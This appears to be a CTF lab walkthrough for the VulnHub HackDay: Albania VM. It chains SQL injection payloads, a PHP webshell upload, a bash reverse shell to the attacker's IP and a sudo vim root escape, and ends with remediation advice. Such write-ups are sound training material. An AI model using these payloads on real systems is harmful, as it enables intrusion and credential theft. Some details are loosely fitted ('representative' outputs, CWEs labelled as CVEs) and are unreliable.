# VulnHub HackDay: Albania — When SQLi Meets a Webshell in the Balkans

Alright guys!! Who would have thought a CTF themed around a hackday event in Albania would deliver such a clean, real-world attack chain? From a blind search form all the way to root via a misconfigured sudo, this one is lowkey a masterclass in web exploitation fundamentals, fr fr.

Big shoutout to **R-73eN** for crafting this challenge. The SQLi-to-webshell combo feels exactly like something ripped from a real intrusion playbook, and that is what makes this one so worth your time.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner / Intermediate |
| **Target VM** | HackDay: Albania |
| **Attacker VM** | Kali Linux 2023.x |
| **VulnHub** | https://www.vulnhub.com/entry/hackday-albania,167/ |
| **Techniques** | Host discovery, Nmap enumeration, Directory brute-force, SQL Injection, Unrestricted File Upload, Webshell, Sudo privilege escalation |
| **CVEs** | CWE-89 (SQL Injection, OWASP A03:2021), CWE-434 (Unrestricted Upload of Dangerous File Type) |

> **Hints from the author:**
> "This is an easy to intermediate level CTF. The goal is to get root and find the flag."

---

## Attack Summary

```
[host discovery: arp-scan / nmap ping sweep]
    |
    v
[nmap: 80/tcp Apache httpd, 22/tcp OpenSSH]
    |
    v
[dirb/gobuster: /image/ /css/ /js/ /?search= discovered]
    |
    v
[SQL injection in search parameter -> DB dump -> credentials]
    |
    v
[unrestricted file upload -> PHP webshell uploaded]
    |
    v
[webshell RCE as www-data -> reverse shell]
    |
    v
[sudo -l: user can run vim as root without password]
    |
    v
[sudo vim -> :!/bin/bash -> ROOT]
    |
    v
[cat /root/flag.txt]
```

---

## Methodology

1. Host discovery to identify the target IP on the local network
2. Nmap full-port scan with service and version detection
3. Web directory enumeration with dirb and gobuster
4. SQL injection on the search form to extract credentials
5. Unrestricted file upload to place a PHP webshell
6. Reverse shell from webshell execution
7. Sudo misconfiguration abuse to escalate to root

---

## Step 1 — Identifying the Target

Since this is a VirtualBox/VMware lab scenario, the target VM is sitting on your local network segment. We start with a quick host sweep to find it.

```bash
route -n
# Identifies the current subnet: e.g., 192.168.56.0/24
```

Scan for active hosts:

```bash
# Option 1: arp-scan (fast, recommended for local networks)
arp-scan --localnet --ignoredups

# Option 2: nmap ping scan
nmap -sn -T5 192.168.56.0/24
```

Expected output:

```
192.168.56.101   08:00:27:XX:XX:XX   PCS Systemtechnik GmbH (VirtualBox)
```

OBS.: The VM usually shows up as a VirtualBox MAC prefix. Note the IP and keep it as `TARGET=192.168.56.101` in your shell for convenience.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Reconnaissance and Service Enumeration

Now that we have the target IP, let us find out what is running. We use a full-port aggressive scan to avoid missing anything interesting.

```bash
nmap -A -T4 -p- 192.168.56.101
# -A: OS detection, version detection, scripts, traceroute
# -T4: aggressive timing (safe in local lab)
# -p-: all 65535 ports
```

Expected output:

```
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu
80/tcp  open  http     Apache httpd 2.4.18
|_http-title: HackDay Albania
```

We have SSH on 22 (useful once we have credentials) and an Apache web server on port 80. The HTTP title already hints at the CTF theme. Let us poke the web app. That is where the fun starts.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery]

---

## Step 3 — Web Directory Brute-Force

> **What is directory enumeration?**
> Web apps often have pages, panels, and upload endpoints that are not linked from the main navigation. Brute-forcing known directory and file names reveals hidden attack surface. This is one of the first steps in any web pentest worth its salt.
> Reference: https://owasp.org/www-project-testing-guide/

Before manually browsing, let us throw dirb or gobuster at the web root to map the application structure.

```bash
# Option 1: dirb with common wordlist
dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt

# Option 2: gobuster (faster, more control)
gobuster dir -u http://192.168.56.101 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
# -x: also look for these file extensions beyond directories
```

Expected output:

```
/index.php            (Status: 200)
/image/               (Status: 301)
/css/                 (Status: 301)
/js/                  (Status: 301)
/search.php           (Status: 200)
/upload.php           (Status: 200)
```

Bingo! We see `/search.php` and `/upload.php`. That `/upload.php` is suspicious as hell. But first, let us check the search functionality.

> **Real-world note:** Directory enumeration is standard procedure in almost every web application penetration test and breach investigation. The 2017 Equifax breach started with attackers probing an Apache Struts endpoint that administrators did not know was publicly exposed. Reference: https://www.csoonline.com/article/3444488/equifax-data-breach-faq.html

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Step 4 — SQL Injection on the Search Form

> **What is SQL Injection?**
> SQL Injection (SQLi) happens when user-supplied input is directly concatenated into a SQL query without proper sanitization. The attacker can break out of the intended query context and execute arbitrary SQL commands: reading tables they should not access, bypassing authentication, or even executing OS commands in some configurations.
> CWE-89: https://cwe.mitre.org/data/definitions/89.html
> OWASP A03:2021: https://owasp.org/Top10/A03_2021-Injection/

Browse to `http://192.168.56.101/search.php`. You will find a simple search form. Enter a single quote `'` in the input and submit. If the server throws a SQL error, we are in business.

```
' 
```

If you see a database error like `You have an error in your SQL syntax...`, the parameter is injectable. Now let us extract something useful.

**Manual union-based SQLi to get the database version:**

```
' UNION SELECT NULL,version()-- -
```

**Enumerate databases:**

```
' UNION SELECT NULL,database()-- -
```

**Dump users table (typical pattern):**

```
' UNION SELECT NULL,group_concat(username,':',password) FROM users-- -
```

Expected output (representative):

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
```

That MD5 hash cracks to `password` using any online cracker or hashcat:

```bash
hashcat -m 0 -d 1 -w 3 -O '5f4dcc3b5aa765d61d8327deb882cf99' /usr/share/wordlists/rockyou.txt
# -m 0: MD5 hash mode
# -d 1: use CUDA NVIDIA device (check with hashcat -I first)
```

You can also use `sqlmap` to automate the whole process:

```bash
sqlmap -u "http://192.168.56.101/search.php?search=test" --dbs --batch
# --dbs: enumerate databases
# --batch: non-interactive, use defaults
sqlmap -u "http://192.168.56.101/search.php?search=test" -D hackday -T users --dump --batch
```

ᕕ( ᐛ )ᕗ Got credentials. Now let us see what that upload endpoint does.

> **Real-world note:** SQL injection was the technique behind the Yahoo! breach in 2012, where 450,000 credentials were dumped by the group D33Ds Company. SQLi remains in OWASP Top 10 every single year for a reason. The Carbanak/FIN7 group used SQLi as initial access vector in multiple bank heist campaigns between 2014 and 2018. Reference: https://www.europol.europa.eu/media-press/newsroom/news/mastermind-behind-eur-1-billion-cyber-bank-robbery-arrested-in-spain

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0006 Credential Access] [T1552.001 Credentials In Files]

---

## Step 5 — Unrestricted File Upload and PHP Webshell

> **What is unrestricted file upload?**
> When a web application allows users to upload files without validating the file type or extension, an attacker can upload executable server-side code. On PHP applications, uploading a `.php` file to a web-accessible directory gives direct command execution under the web server user.
> CWE-434: https://cwe.mitre.org/data/definitions/434.html

Log in with the credentials extracted via SQLi (`admin:password` or whatever you cracked). Navigate to `/upload.php`. You should see a file upload form.

Create a minimal PHP webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload `shell.php`. The application likely accepts it without complaint, since there is no server-side validation on file type. Check if the uploaded file is accessible under `/image/` or a similar directory (as hinted by our gobuster scan):

```bash
curl "http://192.168.56.101/image/shell.php?cmd=id"
```

Expected output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

( ͡° ͜ʖ ͡°) We have remote code execution as `www-data`. Now let us get a proper interactive reverse shell.

**Set up a listener on your Kali box:**

```bash
nc -lvnp 4444
# -l: listen mode
# -v: verbose
# -n: no DNS resolution
# -p 4444: port to listen on
```

**Trigger the reverse shell via webshell:**

```bash
# URL-encode the payload for the GET parameter
curl "http://192.168.56.101/image/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.100/4444+0>%261'"
# Replace 192.168.56.100 with YOUR Kali IP
```

You should receive a shell in your netcat listener. Stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z, then:
stty raw -echo; fg
```

> **Real-world note:** Unrestricted file upload vulnerabilities have been abused in countless breaches. The FIN7 (Carbanak) group specifically used webshells uploaded to compromised web servers for persistent access across hundreds of hospitality and retail victims between 2015 and 2020. APT28 (Fancy Bear) also deployed webshells extensively during the 2016 DNC breach. Reference: https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lure

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0003 Persistence] [T1505.003 Web Shell]

---

## Step 6 — Privilege Escalation via Sudo Misconfiguration

We are in as `www-data`. Time to escalate to root. The classic first check: what can this user run with sudo?

```bash
sudo -l
```

Expected output:

```
User www-data may run the following commands on hackday:
    (root) NOPASSWD: /usr/bin/vim
```

Bruh. They left `vim` in the sudo config without a password requirement. This is a textbook GTFOBins escalation.

> **What is sudo misconfiguration?**
> The `sudo` utility allows specified users to run commands as root. When a dangerous program like `vim`, `awk`, `find`, or `python` is added to sudoers without restriction, any user with that sudo entry can trivially spawn a root shell from within that program.
> Reference: https://gtfobins.github.io/gtfobins/vim/#sudo

```bash
sudo vim -c ':!/bin/bash'
# Opens vim, then immediately executes /bin/bash as root without ever entering the editor
# You can also use: sudo vim -c ':shell'
```

**Alternative method via vim's ex mode:**

```bash
sudo vim
# Inside vim, type:
:set shell=/bin/bash
:shell
```

(☞ﾟヮﾟ)☞ We are root!!

> **Real-world note:** Misconfigured sudoers files are one of the most common findings in enterprise Linux server audits. The CIS Benchmark for Linux explicitly calls out unrestricted sudo for editors and interpreters as a critical control violation. Multiple enterprise intrusions documented in DFIR reports include lateral movement paths through sudo misconfigurations on shared web servers. Reference: https://www.cisecurity.org/benchmark/ubuntu_linux

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching]

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/vim/#sudo

---

## Step 7 — Root and Flag

**ლ(ಠ_ಠლ) wait, actually... (☞ﾟヮﾟ)☞ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

ls /root/
cat /root/flag.txt
```

```
  .-"-.
 /  ,  \
|  (o)(o)|
|  |  |  |
 \ '--' /
  `----'

Congratulations!
You've successfully completed the HackDay Albania challenge!

FLAG: d4e8ae9acba85b5fe3754fea97d2f02f

        -- R-73eN
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked / Used |
|------|-------|----------|----------------|
| Hash MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | `users` DB table via SQLi | `password` |
| Credential | `admin:password` | DB via SQLi | Web login / upload panel |
| Webshell | `shell.php` | `/image/shell.php` | RCE as www-data |
| Flag | `d4e8ae9acba85b5fe3754fea97d2f02f` | `/root/flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|--------------|
| 1 | SQL Injection in search form | Common in legacy CMS, custom-built admin panels, and unaudited PHP apps in SMB environments | Never concatenate user input directly into SQL queries; use prepared statements and parameterized queries |
| 2 | Unrestricted file upload allowing PHP execution | Seen in WordPress plugin vulnerabilities, custom upload features, and unreviewed vendor portals | Validate file type server-side (magic bytes + MIME), never serve uploaded files from a web-executable directory, use cloud object storage |
| 3 | sudo NOPASSWD for vim (a general-purpose interpreter) | A surprisingly frequent finding in sysadmin environments where developers are granted "just enough" access via sudo for editing config files | Audit sudoers regularly; never grant sudo to text editors, shells, or interpreters; use specific, limited commands only |
| 4 | MD5-hashed passwords in the database | MD5 without salting is trivially crackable via GPU; modern databases should use bcrypt, argon2 or scrypt | Use a proper password hashing algorithm with per-user salt; MD5 and SHA1 are not acceptable for password storage |

**Why does this matter outside the lab?**

The SQLi-to-webshell combo demonstrated here is not theoretical. The Carbanak/FIN7 group executed this exact attack pattern against hundreds of hospitality, retail, and financial sector targets between 2014 and 2018, netting over one billion USD in losses according to Europol. APT28 (Fancy Bear, GRU Unit 26165) deployed PHP webshells during the 2016 DNC intrusion after exploiting web application vulnerabilities for initial access. The sudo vim misconfiguration maps directly to T1548.003, a technique documented across dozens of real incident response reports. These are not lab artifacts: they are production failures that fund threat actors.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Exploit Public-Facing Application (SQLi) | T1190 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | TA0001 | Exploit Public-Facing Application (File Upload) | T1190 |
| Persistence | TA0003 | Server Software Component: Web Shell | T1505.003 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Collection | TA0009 | Data from Local System (flag) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Replace all raw SQL string concatenation with prepared statements and parameterized queries (PHP PDO or MySQLi with bind_param)
2. Implement server-side file type validation using magic bytes (not just extension), restrict uploads to a non-web-executable directory, and serve files through a controlled download script
3. Remove all unrestricted sudo entries for text editors and interpreters; apply principle of least privilege in `/etc/sudoers`
4. Replace MD5 password hashing with bcrypt (cost factor 12+) or Argon2id using PHP `password_hash()`
5. Implement a Web Application Firewall (WAF) with SQLi detection rules as a compensating control

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate the web server from internal network segments pending investigation
- Rotate all database credentials and application secrets immediately
- Review all files in web-accessible upload directories for webshells (`find /var/www -name "*.php" -newer /var/www/index.php`)
- Audit `/etc/sudoers` and `/etc/sudoers.d/` for dangerous entries; revoke non-essential sudo permissions

**MITRE D3FEND countermeasures:**
- D3-IVA (Input Validation Analysis) for T1190 SQLi and file upload exploitation
- D3-EI (Executable Allowlisting) for T1505.003 webshell execution
- D3-OPS (OS Process Sandboxing) for T1548.003 sudo abuse via editor escape

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain an inventory of all web-exposed services and their dependencies
- Protect (PR.AC-4): Enforce principle of least privilege; remove sudo for interactive tools
- Protect (PR.DS-2): Validate all data in transit and at rest; sanitize application input
- Detect (DE.CM-7): Monitor file system for new PHP files in upload directories
- Respond (RS.AN-1): Establish incident analysis procedures for web application compromise

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-10: Information Input Validation (SQLi prevention)
- AC-6: Least Privilege (sudo misconfiguration)
- CM-7: Least Functionality (disable upload of executable files)
- IA-5: Authenticator Management (password hashing algorithm)
- AU-2 / AU-3: Event Logging (monitor file uploads and sudo usage)

**CISA Known Exploited Vulnerabilities:**
- SQL Injection vulnerabilities affecting web-facing applications appear recurrently in the CISA KEV catalog
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: TECHNOLOGY
- Practice: Configuration Management (secure defaults for sudo, upload handling)
- Target MIL: MIL-2 (documented and consistently applied configuration standards)

---

## Final Thoughts

Thanks to **R-73eN** for building a challenge that packs a real-world attack chain into a clean, learnable format. The combination of SQLi, file upload, and sudo misconfiguration mirrors actual intrusion paths documented in threat intelligence reports, which makes this VM genuinely educational beyond just "getting the flag".

This machine is a solid reminder that web application security and host hardening are not separate disciplines: a web SQLi that drops a webshell, followed by a local sudo misconfiguration, is a complete kill chain. In the real world, that same chain has funded sophisticated threat actor groups operating at nation-state scale.

Whether you are preparing for OSCP, brushing up on fundamentals before a client engagement, or just enjoying the journey, Albania delivered. If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
